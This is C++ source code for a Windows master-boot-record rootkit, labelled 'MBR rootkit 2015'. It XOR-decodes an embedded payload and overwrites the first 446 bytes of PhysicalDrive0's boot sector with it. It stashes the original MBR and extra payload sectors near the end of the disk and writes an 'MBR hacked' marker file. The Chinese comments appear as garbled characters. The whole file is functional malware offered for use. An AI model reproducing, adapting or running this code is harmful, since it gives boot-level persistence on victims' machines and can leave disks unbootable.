// MBR rootkit 2015 
// by Eric21.com

#include <windows.h>
#include <tchar.h>
#include <winioctl.h>
#include "targetver.h"
#include "res/win7_x64.h"
////////////////////////////////////////////
int _tmain()
{
	HANDLE hMark;//�ļ����
	hMark = CreateFile("C:\\MBR.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	////////////////////////////////////////////////
	if (hMark == INVALID_HANDLE_VALUE)
	{
		for (int i = 0; i < sizeof(w764Array); i++)
		{
			//szArray[i] = ~ szArray[i]; // ȡ�� ~
			w764Array[i] = w764Array[i] ^ 123; // ��� ^
		}
		DWORD dwSize;
		dwSize = sizeof(w764Array);
		LPBYTE lpBuffer = new BYTE[dwSize];
		memcpy(lpBuffer, w764Array, dwSize);
		HANDLE hPhysicalDrive = CreateFile("\\\\.\\PHYSICALDRIVE0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
			OPEN_EXISTING, 0, NULL);
		if (hPhysicalDrive == INVALID_HANDLE_VALUE)
		{
			//OutputDebugString("Open Drive0 Failed!");
			delete lpBuffer;
			return 0;
		}
		BYTE BootSector[512];//ԭʼMBR
		DWORD NumberOfBytesRead;
		if (SetFilePointer(hPhysicalDrive, 0, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER ||
			!ReadFile(hPhysicalDrive, &BootSector, 512, &NumberOfBytesRead, NULL))
		{
			//OutputDebugString("��ȡԭʼMBRʧ��!");
			delete lpBuffer;
			CloseHandle(hPhysicalDrive);
			return 0;
		}
		BYTE backBootSector[512];
		memcpy(&backBootSector, &BootSector, 512);
		memcpy(&backBootSector, lpBuffer, 446);


		SetFilePointer(hPhysicalDrive, 0, 0, FILE_BEGIN);//���ļ���ʱ����ƶ�ָ�룬����Ҫ������
		WriteFile(hPhysicalDrive, backBootSector, 512, &NumberOfBytesRead, NULL);//MBR��Ⱦ446

		DISK_GEOMETRY_EX pdg = { 0 };
		DWORD junk = 0;                     // discard results
		DeviceIoControl(hPhysicalDrive,                       // device to be queried                            
			IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, // operation to perform                            
			NULL, 0,                       // no input buffer                            
			&pdg, sizeof(pdg),            // output buffer                            
			&junk,                         // # bytes returned                            
			(LPOVERLAPPED)NULL);          // synchronous I/O

		//����MBR
		LARGE_INTEGER PositionFileTable;
		PositionFileTable.QuadPart = pdg.DiskSize.QuadPart / 512;
		PositionFileTable.QuadPart -= 10;
		PositionFileTable.QuadPart *= 512;
		NumberOfBytesRead = 0;
		if (!SetFilePointerEx(hPhysicalDrive, PositionFileTable, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER ||
			!WriteFile(hPhysicalDrive, &BootSector, 512, &NumberOfBytesRead, NULL))
		{
			//OutputDebugString("����ԭʼMBRʧ��");
			delete lpBuffer;
			CloseHandle(hPhysicalDrive);
			return 0;
		}

		//д��MBR��������
		PositionFileTable.QuadPart = pdg.DiskSize.QuadPart / 512;
		PositionFileTable.QuadPart -= 9;
		PositionFileTable.QuadPart *= 512;
		if (!SetFilePointerEx(hPhysicalDrive, PositionFileTable, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER ||
			!WriteFile(hPhysicalDrive, lpBuffer + 512, ((dwSize - 512) / 512 + 1) * 512, &NumberOfBytesRead, NULL))//WriteFile����������������512��������
		{
			//OutputDebugString("Write Other Failed!");
			delete lpBuffer;
			CloseHandle(hPhysicalDrive);
			return 0;
		}

		//����MBR loader 
		PositionFileTable.QuadPart = pdg.DiskSize.QuadPart / 512;
		PositionFileTable.QuadPart -= 11;
		PositionFileTable.QuadPart *= 512;
		if (!SetFilePointerEx(hPhysicalDrive, PositionFileTable, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER ||
			!WriteFile(hPhysicalDrive, backBootSector, 512, &NumberOfBytesRead, NULL))//WriteFile����������������512��������
		{
			//OutputDebugString("Write Other Failed!");
			delete lpBuffer;
			CloseHandle(hPhysicalDrive);
			return 0;
		}


		delete lpBuffer;
		CloseHandle(hPhysicalDrive);
		/////////////////////////////////
		//�����޸ı�ʶ
		char text[] = "MBR hacked";
		DWORD dwBytesWritten = 0;
		HANDLE hFile;//�ļ����
		hFile = CreateFile(
			"C:\\MBR.bin",//������򿪵��ļ����豸������(������txt�ļ�)��
			GENERIC_WRITE,// �ļ�����Ȩ��,д
			0,//����ģʽ,��������0��ֹ�������̴��ļ����豸
			NULL,//SECURITY_ATTRIBUTES�ṹ����ȫ����������NULL����Ĭ�ϰ�ȫ����
			CREATE_ALWAYS,//���ڴ��ڻ򲻴��ڵ�����ִ�еĲ�����������ʼ�մ���
			FILE_ATTRIBUTE_NORMAL,//�����ļ������ԣ������и��ٻ����ѡ��
			NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			WriteFile(hFile, text, strlen(text), &dwBytesWritten, NULL);
		}
		CloseHandle(hFile);
	}
	CloseHandle(hMark);

	return 1;
}
////////////////////////////////////////////